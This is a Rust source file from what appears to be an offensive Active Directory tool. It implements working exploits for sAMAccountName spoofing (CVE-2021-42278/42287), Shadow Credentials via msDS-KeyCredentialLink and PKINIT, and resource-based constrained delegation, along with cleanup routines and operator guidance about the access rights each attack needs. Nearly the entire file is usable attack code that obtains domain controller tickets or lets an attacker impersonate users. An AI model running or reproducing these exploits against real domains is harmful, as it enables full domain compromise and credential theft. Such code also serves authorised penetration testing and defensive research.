use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use crate::proto::pkinit::{CertificateGenerator, PkinitAuthenticator, PkinitConfig};
use base64::Engine;
use chrono::Utc;
use kerberos_asn1::Asn1Object;
use rsa::pkcs1::DecodeRsaPublicKey;
use rsa::traits::PublicKeyParts;
use rsa::RsaPublicKey;
use sha2::{Digest, Sha256};
use tracing::info;
use x509_parser::prelude::*;

// -------------------------------------------------------------
// CVE-2021-42278 + CVE-2021-42287 -- sAMAccountName Spoofing
// -------------------------------------------------------------

pub struct SamAccountNameSpoofResult {
    pub tgt_ticket: Vec<u8>,
    pub session_key: Vec<u8>,
    pub target_dc: String,
    pub computer_dn: String,
    pub computer_password: String,
}

pub async fn exploit_samname_spoof(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    dc_sam_name: &str,
    password: &str,
) -> Result<SamAccountNameSpoofResult> {
    let spoofed_name = dc_sam_name.trim_end_matches('$');
    let computer_name = format!("{}$", spoofed_name);
    let container_dn = format!("CN=Computers,{}", ldap.base_dn);

    info!("CVE-2021-42278: Creating computer with sAMAccountName={spoofed_name}");
    let computer_dn = ldap
        .add_computer(&computer_name, password, Some(&container_dn))
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "CVE-2021-42278: Failed to create spoofed computer: {e}"
            ))
        })?;

    info!("CVE-2021-42278: Requesting TGT -- KDC should confuse names and issue DC ticket");
    let tgt = crate::proto::kerberos::request_tgt(dc_ip, domain, spoofed_name, password, false)
        .await
        .map_err(|e| OverthroneError::Custom(format!("CVE-2021-42278: TGT request failed: {e}")))?;

    info!("CVE-2021-42278/42287: TGT obtained for {spoofed_name} via KDC confusion");

    Ok(SamAccountNameSpoofResult {
        tgt_ticket: tgt.ticket.build(),
        session_key: tgt.session_key,
        target_dc: dc_ip.to_string(),
        computer_dn,
        computer_password: password.to_string(),
    })
}

// -------------------------------------------------------------
// Shadow Credentials -- msDS-KeyCredentialLink -> PKINIT TGT
// -------------------------------------------------------------

/// GUID for msDS-KeyCredentialLink WriteProperty access
const KEY_CREDENTIAL_LINK_GUID: &str = "5b47d60f-6090-40b2-9f37-2a4de88f3063";

pub struct ShadowCredentialsResult {
    pub target_dn: String,
    pub certificate: Vec<u8>,
    pub private_key: Vec<u8>,
    pub tgt: Vec<u8>,
    pub session_key: Vec<u8>,
}

/// Attempt to add shadow credentials, returning a helpful error if
/// access is denied (LDAP rc=21/insufficient-rights).
///
/// The error includes guidance on required BloodHound edge types and
/// alternatives (RBCD) so the operator knows what to fix.
pub async fn try_exploit_shadow_credentials(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    target_dn: &str,
    target_samname: &str,
) -> Result<ShadowCredentialsResult> {
    match exploit_shadow_credentials(ldap, dc_ip, domain, target_dn, target_samname).await {
        Ok(result) => Ok(result),
        Err(e) => {
            let err_str = e.to_string();
            if err_str.contains("21") || err_str.contains("insufficient") || err_str.contains("Insufficient") {
                Err(OverthroneError::Custom(format!(
                    "Shadow Credentials denied -- insufficient access rights.\n\
                     Your user needs ONE of these on the target object:\n\
                     1. GenericAll (full control)\n\
                     2. GenericWrite\n\
                     3. WriteProperty on msDS-KeyCredentialLink (GUID: {KEY_CREDENTIAL_LINK_GUID})\n\
                     \n\
                     Check with BloodHound: look for AddKeyCredentialLink edge from your user to {target_dn}\n\
                     Alternative: try RBCD (`ovt acl shadow-creds` or `ovt exploit rbcd`)\n\
                     (requires GenericWrite on target or WriteProperty on msDS-AllowedToActOnBehalfOfOtherIdentity)\n\
                     \n\
                     Original error: {err_str}"
                )))
            } else {
                Err(e)
            }
        }
    }
}

pub async fn exploit_shadow_credentials(
    ldap: &mut LdapSession,
    dc_ip: &str,
    domain: &str,
    target_dn: &str,
    target_samname: &str,
) -> Result<ShadowCredentialsResult> {
    let (cert_der, private_key_der) = CertificateGenerator::generate_certificate(target_dn, 2048)?;

    let key_cred_dn_binary = build_key_credential_dn_binary(&cert_der, target_dn)?;

    info!(
        "Shadow Credentials: Writing msDS-KeyCredentialLink to {target_dn} ({} chars)",
        key_cred_dn_binary.len()
    );
    ldap.modify_add(target_dn, "msDS-KeyCredentialLink", &[key_cred_dn_binary])
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "Shadow Credentials: Failed to write KeyCredentialLink: {e}"
            ))
        })?;

    info!("Shadow Credentials: Authenticating via PKINIT as {target_dn}");
    let pkinit_cfg = PkinitConfig {
        certificate: cert_der.clone(),
        private_key: private_key_der.clone(),
        realm: domain.to_uppercase(),
        username: target_samname.to_string(),
        kdc_host: dc_ip.to_string(),
        check_revocation: false,
        revocation_timeout_secs: 5,
    };
    let authenticator = PkinitAuthenticator::new(pkinit_cfg);
    let pkinit_result = authenticator.authenticate().await.map_err(|e| {
        OverthroneError::Custom(format!(
            "Shadow Credentials: PKINIT authentication failed: {e}"
        ))
    })?;

    info!("Shadow Credentials: TGT obtained for {target_dn}");

    Ok(ShadowCredentialsResult {
        target_dn: target_dn.to_string(),
        certificate: cert_der,
        private_key: private_key_der,
        tgt: pkinit_result.tgt,
        session_key: pkinit_result.session_key,
    })
}

// -------------------------------------------------------------
// RBCD -- Resource-Based Constrained Delegation
// -------------------------------------------------------------

pub struct RbcdResult {
    pub target_dn: String,
    pub attacker_sid: String,
    pub attacker_computer: String,
}

pub async fn exploit_rbcd(
    ldap: &mut LdapSession,
    _dc_ip: &str,
    _domain: &str,
    target_dn: &str,
    attacker_computer_sam: &str,
    _password: &str,
) -> Result<RbcdResult> {
    let sid_bytes = ldap
        .resolve_object_sid_binary(attacker_computer_sam)
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "RBCD: Failed to resolve attacker SID for {attacker_computer_sam}: {e}"
            ))
        })?;

    let sid_str = sid_bytes_to_string(&sid_bytes);
    info!("RBCD: Attacker SID = {sid_str}, writing to {target_dn}");

    let sd = build_trustee_security_descriptor(&sid_bytes)?;

    ldap.modify_replace(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "RBCD: Failed to write msDS-AllowedToActOnBehalfOfOtherIdentity: {e}"
            ))
        })?;

    info!(
        "RBCD: Delegation set -- {attacker_computer_sam} can now impersonate any user to {target_dn}"
    );

    Ok(RbcdResult {
        target_dn: target_dn.to_string(),
        attacker_sid: sid_str,
        attacker_computer: attacker_computer_sam.to_string(),
    })
}

// -------------------------------------------------------------
// Cleanup Functions
// -------------------------------------------------------------

pub async fn cleanup_rbcd(ldap: &mut LdapSession, target_dn: &str) -> Result<()> {
    ldap.modify_delete(target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity")
        .await
        .map_err(|e| OverthroneError::Custom(format!("RBCD cleanup failed on {target_dn}: {e}")))?;
    info!("RBCD: Cleaned up msDS-AllowedToActOnBehalfOfOtherIdentity on {target_dn}");
    Ok(())
}

pub async fn cleanup_samname_spoof(ldap: &mut LdapSession, computer_dn: &str) -> Result<()> {
    ldap.delete_entry(computer_dn)
        .await
        .map_err(|e| OverthroneError::Custom(format!("Cleanup spoofed computer failed: {e}")))?;
    info!("CVE-2021-42278: Cleaned up spoofed computer {computer_dn}");
    Ok(())
}

pub async fn cleanup_shadow_credentials(ldap: &mut LdapSession, target_dn: &str) -> Result<()> {
    ldap.modify_delete(target_dn, "msDS-KeyCredentialLink")
        .await
        .map_err(|e| {
            OverthroneError::Custom(format!(
                "Shadow Credentials cleanup failed on {target_dn}: {e}"
            ))
        })?;
    info!("Shadow Credentials: Cleaned up msDS-KeyCredentialLink on {target_dn}");
    Ok(())
}

// -------------------------------------------------------------
// Internal Helpers
// -------------------------------------------------------------

/// Build a `msDS-KeyCredentialLink` value in the AD `DN-Binary` string format.
/// The binary portion is a `KEYCREDENTIALLINK_BLOB` (custom binary format, not DER),
/// and the whole value is wrapped as `B:<char_count>:<hex>:<dn>`, which is what
/// Active Directory expects for `DNWithBinary` syntax attributes.
fn build_key_credential_dn_binary(cert_der: &[u8], target_dn: &str) -> Result<String> {
    let (_, cert) = X509Certificate::from_der(cert_der)
        .map_err(|e| OverthroneError::Encryption(format!("Cert parse: {e}")))?;

    // The certificate's SubjectPublicKeyInfo raw value is the PKCS#1 RSAPublicKey DER.
    let rsa_pk_der = cert.public_key().subject_public_key.data.as_ref();
    let rsa_pub = RsaPublicKey::from_pkcs1_der(rsa_pk_der)
        .map_err(|e| OverthroneError::Encryption(format!("RSA public key parse: {e}")))?;

    // User NGC keys must be in BCRYPT_RSAKEY_BLOB format.
    let key_material = rsa_pub_to_bcrypt_public_blob(&rsa_pub)?;

    // Build the custom KEYCREDENTIALLINK_BLOB binary format.
    let key_cred_blob = build_key_credential_blob(&key_material)?;

    // Wrap in DNWithBinary string syntax: B:<char_count>:<uppercase_hex>:<dn>
    let hex_blob = hex::encode_upper(&key_cred_blob);
    let char_count = hex_blob.len();
    Ok(format!("B:{}:{}:{}", char_count, hex_blob, target_dn))
}

/// Convert an RSA public key to a BCRYPT_RSAKEY_BLOB (public key only).
/// Format: Magic('RSA1') | BitLength | cbPublicExp | cbModulus | cbPrime1 | cbPrime2 | PublicExponent | Modulus
fn rsa_pub_to_bcrypt_public_blob(rsa_pub: &RsaPublicKey) -> Result<Vec<u8>> {
    let n = rsa_pub.n();
    let e = rsa_pub.e();
    let bit_length = (n.bits() as u32).max(1);
    let modulus_bytes = n.to_bytes_le();
    let modulus_len = modulus_bytes.len() as u32;

    // Public exponent as little-endian minimal bytes.
    let exp_bytes = e.to_bytes_le();
    let exp_len = exp_bytes.len() as u32;

    let mut blob = Vec::with_capacity(24 + exp_bytes.len() + modulus_bytes.len());
    blob.extend_from_slice(&0x31415352u32.to_le_bytes()); // BCRYPT_RSAPUBLIC_MAGIC "RSA1"
    blob.extend_from_slice(&bit_length.to_le_bytes());
    blob.extend_from_slice(&exp_len.to_le_bytes());
    blob.extend_from_slice(&modulus_len.to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes()); // cbPrime1
    blob.extend_from_slice(&0u32.to_le_bytes()); // cbPrime2
    blob.extend_from_slice(&exp_bytes);
    blob.extend_from_slice(&modulus_bytes);
    Ok(blob)
}

/// Build the custom KEYCREDENTIALLINK_BLOB structure (MS-ADTS 2.2.19).
fn build_key_credential_blob(key_material: &[u8]) -> Result<Vec<u8>> {
    let now = Utc::now();
    let filetime = datetime_to_filetime(now);
    let device_id = uuid::Uuid::new_v4();
    let custom_key_info = vec![0x01, 0x00]; // Version 1, KeyFlags::None

    // Key identifier for Version2 is the base64-encoded SHA256 hash of the key material.
    let key_id_hash = sha256(key_material);
    let key_id_value = base64::engine::general_purpose::STANDARD.encode(&key_id_hash);

    // Serialize properties that appear after the KeyHash entry.
    let mut properties = Vec::new();
    write_entry(&mut properties, 0x03, key_material); // KeyMaterial
    write_entry(&mut properties, 0x04, &[0x01]); // KeyUsage::NGC
    write_entry(&mut properties, 0x05, &[0x00]); // KeySource::AD
    write_entry(&mut properties, 0x06, device_id.as_bytes()); // DeviceId
    write_entry(&mut properties, 0x07, &custom_key_info); // CustomKeyInformation
    write_entry(&mut properties, 0x08, &filetime); // KeyApproximateLastLogonTimeStamp
    write_entry(&mut properties, 0x09, &filetime); // KeyCreationTime

    // KeyHash is SHA256 of all entries following it.
    let key_hash = sha256(&properties);

    let mut blob = Vec::new();
    blob.extend_from_slice(&2u32.to_le_bytes()); // Version 2
    write_entry(&mut blob, 0x01, key_id_value.as_bytes()); // KeyID
    write_entry(&mut blob, 0x02, &key_hash); // KeyHash
    blob.extend_from_slice(&properties);
    Ok(blob)
}

fn write_entry(buf: &mut Vec<u8>, entry_type: u8, value: &[u8]) {
    let len = value.len();
    if len > u16::MAX as usize {
        // Truncate defensively; real key material never exceeds this.
        buf.extend_from_slice(&(u16::MAX).to_le_bytes());
        buf.push(entry_type);
        buf.extend_from_slice(&value[..u16::MAX as usize]);
    } else {
        buf.extend_from_slice(&(len as u16).to_le_bytes());
        buf.push(entry_type);
        buf.extend_from_slice(value);
    }
}

fn sha256(data: &[u8]) -> Vec<u8> {
    let mut hasher = Sha256::new();
    hasher.update(data);
    hasher.finalize().to_vec()
}

/// Convert a chrono DateTime<Utc> to a Windows FILETIME (64-bit little-endian,
/// 100-nanosecond intervals since January 1, 1601 UTC).
fn datetime_to_filetime(dt: chrono::DateTime<Utc>) -> [u8; 8] {
    let unix_nanos = dt.timestamp_nanos_opt().unwrap_or(0) as u128;
    let ft = unix_nanos / 100 + 11_644_473_600_000_000u128;
    (ft as u64).to_le_bytes()
}

fn build_trustee_security_descriptor(attacker_sid: &[u8]) -> Result<Vec<u8>> {
    let sub_authority_count = (attacker_sid.len() - 8) / 4;
    if sub_authority_count > 15 || attacker_sid.len() < 8 {
        return Err(OverthroneError::Custom("Invalid SID length".into()));
    }

    let sd_control = 0x0014u16;
    let dacl_offset = 20u32;

    let mut sd = Vec::new();
    sd.extend_from_slice(&[0x01, 0x00]);
    sd.extend_from_slice(&sd_control.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&0u32.to_le_bytes());
    sd.extend_from_slice(&dacl_offset.to_le_bytes());

    let ace_type: u8 = 0x00;
    let ace_flags: u8 = 0x00;
    let ace_size: u16 = (4 + 4 + attacker_sid.len()) as u16;
    let access_mask: u32 = 0x0000000f;

    sd.push(0x01);
    sd.push(0x00);
    sd.extend_from_slice(&1u16.to_le_bytes());
    sd.extend_from_slice(&0u16.to_le_bytes());
    sd.push(ace_type);
    sd.push(ace_flags);
    sd.extend_from_slice(&ace_size.to_le_bytes());
    sd.extend_from_slice(&access_mask.to_le_bytes());
    sd.extend_from_slice(attacker_sid);

    Ok(sd)
}

fn sid_bytes_to_string(sid_bytes: &[u8]) -> String {
    if sid_bytes.len() < 8 {
        return "S-0-0".to_string();
    }
    let revision = sid_bytes[0];
    let authority = u64::from_be_bytes([
        0,
        0,
        sid_bytes[2],
        sid_bytes[3],
        sid_bytes[4],
        sid_bytes[5],
        sid_bytes[6],
        sid_bytes[7],
    ]);
    let mut parts: Vec<String> = vec![format!("S-{revision}-{authority}")];
    for i in (8..sid_bytes.len()).step_by(4) {
        if i + 4 <= sid_bytes.len() {
            let sub = u32::from_le_bytes([
                sid_bytes[i],
                sid_bytes[i + 1],
                sid_bytes[i + 2],
                sid_bytes[i + 3],
            ]);
            parts.push(sub.to_string());
        }
    }
    parts.join("-")
}
